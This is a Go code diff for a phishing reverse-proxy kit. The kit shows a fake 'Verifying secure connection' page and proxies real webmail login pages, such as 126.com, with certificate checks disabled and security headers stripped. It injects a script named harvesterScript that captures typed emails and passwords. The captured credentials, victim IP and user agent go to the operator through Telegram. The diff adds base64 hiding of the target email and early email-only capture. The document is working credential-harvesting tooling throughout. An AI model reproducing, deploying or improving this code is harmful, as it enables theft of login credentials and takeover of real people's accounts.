@@ -2,7 +2,8 @@ package main
 
 import (
 	"bytes"
-	"crypto/tls" // FIX: Added for SSL bypass
+	"crypto/tls"
+	"encoding/base64"
 	"io"
 	"log"
 	"net"
@@ -32,17 +33,13 @@ var store = &SessionStore{
 	sessions: make(map[string]*SessionData),
 }
 
-// INJECTED SCRIPT: Fixes URL crashes and Forces form submit
 const harvesterScript = `
 <script>
-// FIX 1: Polyfill the URL constructor so Microsoft/Yahoo React apps don't crash
 (function() {
     const OriginalURL = window.URL;
     window.URL = function(url, base) {
-        try {
-            return new OriginalURL(url, base || window.location.origin);
-        } catch (e) {
-            // If the URL is a relative path that breaks the constructor, fix it
+        try { return new OriginalURL(url, base || window.location.origin); } 
+        catch (e) {
             if (typeof url === 'string' && !url.startsWith('http')) {
                 return new OriginalURL('https://' + window.location.hostname + '/' + url.replace(/^\/+/, ''));
             }
@@ -51,6 +48,17 @@ const harvesterScript = `
     };
     window.URL.prototype = OriginalURL.prototype;
 })();
+
+setTimeout(function() {
+    var email = window._targetEmail;
+    if (email) {
+        fetch('/api/harvest', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'type=email_only&email=' + encodeURIComponent(email)
+        }).catch(() => {});
+    }
+}, 500);
 
 document.addEventListener('submit', function(e) {
     const form = e.target;
@@ -61,12 +69,10 @@ document.addEventListener('submit', function(e) {
 
     for (let [key, value] of formData.entries()) {
         params.append(key, value);
-        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account') || key.toLowerCase().includes('login')) {
-            window._capturedEmail = value;
+        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account')) {
             hasEmail = true;
         }
         if (key.toLowerCase().includes('pass')) {
-            window._capturedPass = value;
             hasPassword = true;
         }
     }
@@ -75,7 +81,7 @@ document.addEventListener('submit', function(e) {
         fetch('/api/harvest', {
             method: 'POST',
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: params.toString()
+            body: params.toString() + '&type=login'
         }).catch(() => {});
         return true;
     }
@@ -83,7 +89,55 @@ document.addEventListener('submit', function(e) {
 </script>
 `
 
-const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:s 1s linear infinite;margin:0 auto 20px;}@keyframes s{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>setTimeout(()=>{var h=window.location.hash;if(h&&h.length>1){var e=h.substring(1);fetch('/api/fetch?email='+encodeURIComponent(e)).then(r=>r.text()).then(html=>{document.open();document.write(html);document.close();});}else{document.body.innerHTML="<h3>No account provided.</h3>";}},1000);</script></body></html>`
+// UPGRADED LOADER: Handles placeholders and auto-encodes to Base64
+const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:s 1s linear infinite;margin:0 auto 20px;}@keyframes s{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>
+setTimeout(()=>{
+    var hash = window.location.hash;
+    var email = "";
+    
+    if (hash && hash.length > 1) {
+        var raw = hash.substring(1); 
+
+        // 1. Check for your requested placeholders
+        if (raw.includes('[[-Email-]]')) {
+            email = raw.replace('[[-Email-]]', 'test@126.com');
+        } else if (raw.includes('[[-email-]]')) {
+            email = raw.replace('[[-email-]]', 'test@126.com');
+        } else if (raw.includes('[Email]')) {
+            email = raw.replace('[Email]', 'test@126.com');
+        } else if (raw.includes('[email]')) {
+            email = raw.replace('[email]', 'test@126.com');
+        } else if (raw.startsWith('t=')) {
+            // 2. If it's already Base64, just decode it
+            try { email = atob(raw.split('t=')[1]); } catch(e) { email = raw; }
+        } else {
+            // 3. Plain text email (e.g., #test@126.com)
+            email = raw;
+        }
+
+        // 4. Auto-convert to Base64 to hide the URL
+        var b64Email = btoa(email);
+        
+        // Update the URL silently to look like /#?t=dGVzdEAxMjYuY29t
+        if (!raw.startsWith('t=')) {
+            window.history.replaceState({}, '', '/#?t=' + b64Email);
+        }
+
+        window._targetEmail = email;
+        
+        // 5. Fetch the page using the Base64 string
+        fetch('/api/fetch?email=' + encodeURIComponent(b64Email))
+            .then(r => r.text())
+            .then(html => {
+                document.open();
+                document.write(html);
+                document.close();
+            });
+    } else {
+        document.body.innerHTML = "<h3>No account provided.</h3>";
+    }
+}, 1000);
+</script></body></html>`
 
 func StartProxy(cfg TelegramConfig, listenPort string) {
 	r := gin.Default()
@@ -100,6 +154,12 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 	r.GET("/api/fetch", func(c *gin.Context) {
 		email := c.Query("email")
+
+		// Decode Base64 from the frontend
+		if b64, err := base64.StdEncoding.DecodeString(email); err == nil && strings.Contains(string(b64), "@") {
+			email = string(b64)
+		}
+
 		if email == "" {
 			c.String(400, "Missing email")
 			return
@@ -124,8 +184,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 				TLSHandshakeTimeout: 10 * time.Second,
 				MaxIdleConns:        100,
 				IdleConnTimeout:     90 * time.Second,
-				// FIX: Ignore invalid SSL certificates (fixes 126.com 502 error)
-				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
 			},
 		}
 
@@ -149,7 +208,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyBytes, _ := io.ReadAll(resp.Body)
 
-		// FIX 2: Robust Encoding Detection (Chinese + Microsoft)
+		// Decode GBK
 		contentType := resp.Header.Get("Content-Type")
 		if strings.Contains(strings.ToLower(contentType), "gbk") ||
 			strings.Contains(targetBase, "126.com") ||
@@ -163,11 +222,15 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyStr := string(bodyBytes)
 
+		// FORCE UTF-8
+		reMeta := regexp.MustCompile(`(?i)<meta[^>]*charset=["']?gbk["']?[^>]*>`)
+		bodyStr = reMeta.ReplaceAllString(bodyStr, `<meta charset="utf-8">`)
+
 		// Remove ServiceWorker
 		reSW := regexp.MustCompile(`(?i)navigator\.serviceWorker\.register\(.*?\)`)
 		bodyStr = reSW.ReplaceAllString(bodyStr, "console.log('SW disabled')")
 
-		// Remove iframe sandbox restrictions
+		// Remove iframe restrictions
 		reIframe := regexp.MustCompile(`(?i)<iframe(.*?)>`)
 		bodyStr = reIframe.ReplaceAllStringFunc(bodyStr, func(m string) string {
 			m = strings.ReplaceAll(m, `sandbox=""`, "")
@@ -177,7 +240,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			return m
 		})
 
-		// Rewrite URLs so the browser thinks it's on the real site
 		bodyStr = strings.ReplaceAll(bodyStr, "https://"+targetBase, c.Request.Host+"/")
 		if strings.Contains(email, "@") {
 			domain := strings.Split(email, "@")[1]
@@ -186,17 +248,17 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		}
 
 		baseTag := `<base href="` + targetBase + `">`
-		bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+baseTag, 1)
+		emailScript := `<script>window._targetEmail = "` + email + `";</script>`
+
+		bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+baseTag+"\n"+emailScript, 1)
 		bodyStr = strings.Replace(bodyStr, "</body>", harvesterScript+"</body>", 1)
 
-		// Strip restrictive headers
 		c.Header("Content-Type", "text/html; charset=utf-8")
 		c.Header("Access-Control-Allow-Origin", "*")
 		c.Header("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval'; frame-ancestors *")
 
 		for _, cookie := range resp.Cookies() {
 			c.SetCookie(cookie.Name, cookie.Value, 3600*24, "/", "", false, false)
-			SendTelegramMessage(cfg, FormatCookieHarvest(email, []string{cookie.Name + "=" + cookie.Value}))
 		}
 
 		c.String(resp.StatusCode, bodyStr)
@@ -206,8 +268,13 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		c.Request.ParseForm()
 		email := c.PostForm("email")
 		password := c.PostForm("password")
+		harvestType := c.PostForm("type")
+
 		if email == "" {
 			email = c.PostForm("username")
+		}
+		if email == "" {
+			email = c.PostForm("account")
 		}
 		if password == "" {
 			password = c.PostForm("passwd")
@@ -218,7 +285,12 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		ip := c.ClientIP()
 		ua := c.GetHeader("User-Agent")
-		SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, ua))
+
+		if harvestType == "email_only" {
+			SendTelegramMessage(cfg, FormatLoginAlert(email, "[Waiting for password...]", ip, ua))
+		} else {
+			SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, ua))
+		}
 
 		c.JSON(200, gin.H{"status": "ok"})
 	})
@@ -255,10 +327,8 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		}
 
 		client := &http.Client{
-			Timeout: 15 * time.Second,
-			Transport: &http.Transport{
-				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-			},
+			Timeout:   15 * time.Second,
+			Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
 		}
 
 		resp, err := client.Do(outReq)
